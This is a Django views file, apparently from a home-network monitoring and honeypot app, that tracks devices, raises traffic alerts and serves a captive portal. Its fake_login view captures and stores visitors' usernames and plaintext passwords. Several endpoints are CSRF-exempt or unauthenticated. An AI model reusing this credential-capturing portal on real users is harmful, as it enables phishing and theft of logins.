from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.contrib.auth import logout
from django.http import HttpResponse, HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt
from .models import Device, AllowedDevice, Traffic, TraficoPorMinuto, Alerta, LoginFalso, MacIpCache
from .forms import AllowedDeviceForm
from datetime import date
from django.utils.timezone import now, timedelta
from django.db.models import Count
from collections import Counter
from datetime import timedelta as dtimedelta
from django.db import transaction
import pytz
from datetime import datetime
import os
from django.utils import timezone
from django.http import JsonResponse
import json
import socket

# Django REST Framework
from rest_framework import viewsets
from rest_framework.permissions import AllowAny, IsAuthenticated
from rest_framework.decorators import api_view, authentication_classes, permission_classes
from rest_framework.authentication import TokenAuthentication
from rest_framework.response import Response
from .serializers import AllowedDeviceSerializer
from .utils import enviar_alerta_email, enviar_alerta_trafico_sospechoso
from django.conf import settings

# -------------------------------
# CONSTANTES Y FUNCIONES AUXILIARES
# -------------------------------
def obtener_ip_real(request):
    ip = request.META.get('HTTP_X_FORWARDED_FOR')
    if ip:
        ip = ip.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def root_redirect_view(request):
    # Si estás en DEBUG (modo desarrollo) y vienes desde localhost, muestra dashboard
    if settings.DEBUG and request.META.get('REMOTE_ADDR') in ['127.0.0.1', '::1']:
        return redirect('dashboard')
    
    # Si no, redirige al portal como honeypot
    return redirect('portal')

MACS_EXCLUIDAS = ['e8:de:27:09:f3:4d']

def analizar_umbral_y_alertar(mac):
    if mac.lower() in MACS_EXCLUIDAS:
        return

    UMBRAL_SOLICITUDES_DNS = 100
    UMBRAL_BYTES_MINUTO = 800000
    hace_1min = now() - timedelta(minutes=1)

    # Validación de solicitudes DNS excesivas
    solicitudes_dns = Traffic.objects.filter(
        mac=mac,
        timestamp__gte=hace_1min
    ).count()

    if solicitudes_dns > UMBRAL_SOLICITUDES_DNS:
        if not Alerta.objects.filter(mac=mac, motivo="Solicitudes DNS excesivas", fecha__gte=hace_1min).exists():
            enviar_alerta_trafico_sospechoso(mac, "Solicitudes DNS excesivas", solicitudes_dns)
            Alerta.objects.create(mac=mac, motivo="Solicitudes DNS excesivas", valor_detectado=str(solicitudes_dns))

    # Validación de tráfico excesivo por minuto
    trafico = TraficoPorMinuto.objects.filter(
        mac=mac,
        minuto__gte=hace_1min
    ).order_by('-minuto').first()

    if trafico and trafico.bytes > UMBRAL_BYTES_MINUTO:
        if not Alerta.objects.filter(mac=mac, motivo="Uso excesivo de ancho de banda", fecha__gte=hace_1min).exists():
            enviar_alerta_trafico_sospechoso(mac, "Uso excesivo de ancho de banda", trafico.bytes)
            Alerta.objects.create(mac=mac, motivo="Uso excesivo de ancho de banda", valor_detectado=str(trafico.bytes))


@csrf_exempt
def registrar_mac_ip(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            mac = data.get('mac_address')
            ip = data.get('ip_address')

            if mac and ip:
                MacIpCache.objects.update_or_create(mac=mac, defaults={'ip': ip})
                return JsonResponse({'status': 'ok'})
            else:
                return JsonResponse({'status': 'error', 'message': 'Faltan datos'}, status=400)
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': str(e)}, status=500)
    else:
        return JsonResponse({'status': 'error', 'message': 'Método no permitido'}, status=405)
    
LEASES_FILE = '/var/lib/misc/dnsmasq.leases'


# -------------------------------
# VISTAS PARA PORTAL CAUTIVO (ACTUALIZADAS)
# -------------------------------
@csrf_exempt
def android_check(request):
    """Fuerza la aparición del portal cautivo en Android"""
    return render(request, 'board/portal.html')  # Esto da HTTP 200 con HTML

@csrf_exempt
def apple_check(request):
    """Endpoint mejorado para iOS (todas versiones)"""
    host = request.get_host()
    
    # Para iOS moderno (gateway.fe2.apple-dns.net)
    if any(domain in host for domain in ['apple-dns.net', 'aaplimg.com', 'push.apple.com']):
        return HttpResponse(
            '<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>',
            content_type='text/html'
        )
    
    # Para iOS clásico
    return HttpResponseRedirect("/portal/")

@csrf_exempt
def msft_check(request):
    """Endpoint para Windows"""
    return HttpResponseRedirect("/portal/")

@csrf_exempt
def captive_check(request):
    """Endpoint universal que detecta automáticamente el dispositivo"""
    user_agent = request.META.get('HTTP_USER_AGENT', '').lower()
    
    if 'android' in user_agent:
        return android_check(request)
    elif 'iphone' in user_agent or 'ipad' in user_agent:
        return apple_check(request)
    elif 'windows' in user_agent or 'microsoft' in user_agent:
        return msft_check(request)
    
    # Redirección por defecto (mantiene tu lógica original)
    return HttpResponseRedirect("/portal/")

def portal_view(request):
    user_agent = request.META.get('HTTP_USER_AGENT', '')
    hace_2min = now() - timedelta(minutes=2)
    ultimo = MacIpCache.objects.filter(updated_at__gte=hace_2min).order_by('-updated_at').first()

    if ultimo:
        ip = ultimo.ip
        mac = ultimo.mac
    else:
        ip = "No detectada"
        mac = "No detectada"

    # Detectar si viene un intento fallido
    error = request.GET.get('error') == '1'

    print(f"[DEBUG] Cliente accedió al portal → IP: {ip} | MAC: {mac} | UA: {user_agent} | Error: {error}")

    return render(request, 'board/portal.html', {
        'mac': mac,
        'ip': ip,
        'error': error  # 👈 esto se usará en el HTML
    })

@csrf_exempt
def fake_login(request):
    if request.method == 'POST':
        mac     = request.POST.get('mac', '')
        usuario = request.POST.get('username', '')
        clave   = request.POST.get('password', '')

        ip = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR'))

        LoginFalso.objects.create(
            mac=mac,
            usuario=usuario,
            clave=clave,
            ip=ip,
            host=request.get_host(),
            path=request.get_full_path(),
            user_agent=request.META.get('HTTP_USER_AGENT', ''),
            fecha=now()
        )

        return HttpResponseRedirect("/portal/?error=1")
    return HttpResponseRedirect("/portal/")

# -------------------------------
# VISTAS WEB EXISTENTES (SIN CAMBIOS)
# -------------------------------
@login_required
def dashboard(request):
    devices = Device.objects.order_by('-detected_at')
    hoy = date.today()
    alerta = False
    whitelist = set(AllowedDevice.objects.values_list('mac_address', flat=True))

    # Detectar si hay dispositivos no autorizados hoy
    for d in devices:
        detected_date = d.detected_at.date()
        if d.mac_address not in whitelist and detected_date == hoy:
            alerta = True
            break

    # Añadir campos dinámicos a cada dispositivo
    for d in devices:
        d.is_allowed = d.mac_address in whitelist

        # Buscar IP del AP desde LoginFalso (último login con esa MAC)
        ultimo_login = LoginFalso.objects.filter(mac=d.mac_address).order_by('-fecha').first()
        if ultimo_login:
            d.ap_conectado = ultimo_login.ip
        else:
            d.ap_conectado = None

    return render(request, 'board/dashboard.html', {
        'devices': devices,
        'alerta': alerta,
    })


def about(request):
    return render(request, 'board/about.html')

def logout_confirm_view(request):
    logout(request)
    return render(request, 'registration/logout_confirm.html')

@login_required
def whitelist_list(request):
    devices = AllowedDevice.objects.all()
    return render(request, 'board/whitelist_list.html', {'devices': devices})

@login_required
def whitelist_add(request):
    if request.method == 'POST':
        form = AllowedDeviceForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('whitelist_list')
    else:
        form = AllowedDeviceForm()
    return render(request, 'board/whitelist_form.html', {'form': form})

@login_required
def whitelist_delete(request, pk):
    device = get_object_or_404(AllowedDevice, pk=pk)
    if request.method == 'POST':
        device.delete()
        return redirect('whitelist_list')
    return render(request, 'board/whitelist_confirm_delete.html', {'device': device})

@login_required
def alertas_list(request):
    alertas = Alerta.objects.order_by('-fecha')[:200]
    return render(request, 'board/alertas_list.html', {'alertas': alertas})

@login_required
def capturados_list(request):
    capturados = LoginFalso.objects.order_by('-fecha')[:100]
    whitelist = set(AllowedDevice.objects.values_list('mac_address', flat=True))
    return render(request, 'board/capturados_list.html', {
        'capturados': capturados,
        'whitelist': whitelist
    })

# -------------------------------
# API REST (ACTUALIZADA PERO COMPATIBLE)
# -------------------------------
class WhitelistViewSet(viewsets.ReadOnlyModelViewSet):
    queryset = AllowedDevice.objects.all()
    serializer_class = AllowedDeviceSerializer
    permission_classes = [AllowAny]

@api_view(['POST'])
@authentication_classes([TokenAuthentication])
@permission_classes([IsAuthenticated])
def registrar_trafico(request):
    mac = request.data.get('mac')
    if not mac:
        return Response({'error': 'Falta MAC'}, status=400)

    if 'dominio' in request.data:
        dominio = request.data['dominio']
        Traffic.objects.create(mac=mac, dominio=dominio)
        analizar_umbral_y_alertar(mac)
        return Response({'status': 'ok'})

    elif 'bytes' in request.data and 'minuto' in request.data:
        try:
            minuto_str = request.data['minuto']
            minuto_naive = datetime.strptime(minuto_str, '%Y-%m-%d %H:%M')
            local_tz = pytz.timezone('America/Lima')
            minuto_local_aware = local_tz.localize(minuto_naive)
            minuto_utc = minuto_local_aware.astimezone(pytz.UTC)

            bytes_usados = int(request.data['bytes'])

            with transaction.atomic():
                obj, created = TraficoPorMinuto.objects.get_or_create(
                    mac=mac,
                    minuto=minuto_utc,
                    defaults={'bytes': bytes_usados}
                )
                if not created:
                    obj.bytes += bytes_usados
                    obj.save()

            analizar_umbral_y_alertar(mac)
            return Response({'status': 'ok'})

        except Exception as e:
            return Response({'error': str(e)}, status=400)

    return Response({'error': 'Datos incompletos'}, status=400)

@api_view(['POST'])
@authentication_classes([TokenAuthentication])
@permission_classes([IsAuthenticated])
def update_device(request):
    """Nuevo endpoint unificado para actualizar dispositivos"""
    try:
        mac = request.data.get('mac', '').lower()
        ip = request.data.get('ip', '')
        hostname = request.data.get('hostname', 'dispositivo-desconocido')
        ap_ip = request.data.get('access_point_ip')
        print("📥 access_point_ip recibido:", ap_ip)
        
        if not mac:
            return Response({'error': 'MAC address is required'}, status=400)
            
        device, created = Device.objects.update_or_create(
            mac_address=mac,
            defaults={
                'ip_address': ip,
                'hostname': hostname,
                'ap_conectado': ap_ip,
                'detected_at': now(),
                'is_allowed': AllowedDevice.objects.filter(mac_address=mac).exists()
            }
        )
        
        return Response({
            'status': 'created' if created else 'updated',
            'mac': mac,
            "ap_conectado": device.ap_conectado,
            'is_allowed': device.is_allowed
        })
        
    except Exception as e:
        return Response({'error': str(e)}, status=500)

@login_required
def mac_detail(request, mac_address):
    registros = Traffic.objects.filter(mac=mac_address).order_by('-timestamp')[:100]
    hora_actual = now()
    hace_1hora = hora_actual - timedelta(hours=1)
    ultimos = Traffic.objects.filter(mac=mac_address, timestamp__gte=hace_1hora)

    conteo = {}
    for r in ultimos:
        minuto_local = r.timestamp.astimezone(pytz.timezone('America/Lima')).strftime('%H:%M')
        conteo[minuto_local] = conteo.get(minuto_local, 0) + 1

    datos_grafico = [
        {'minuto': k, 'total': conteo[k]}
        for k in sorted(conteo)
    ]

    registros_bytes = TraficoPorMinuto.objects.filter(
        mac=mac_address,
        minuto__gte=hace_1hora
    ).only('minuto', 'bytes').order_by('minuto')

    local_tz = pytz.timezone('America/Lima')

    datos_bytes = [
        {
            'minuto': (r.minuto.astimezone(local_tz) + dtimedelta(hours=-5)).strftime('%H:%M'),
            'bytes': r.bytes
        }
        for r in registros_bytes
    ]

    context = {
        'mac': mac_address,
        'registros': registros,
        'grafico': datos_grafico,
        'grafico_bytes': datos_bytes,
    }
    return render(request, 'board/mac_detail.html', context)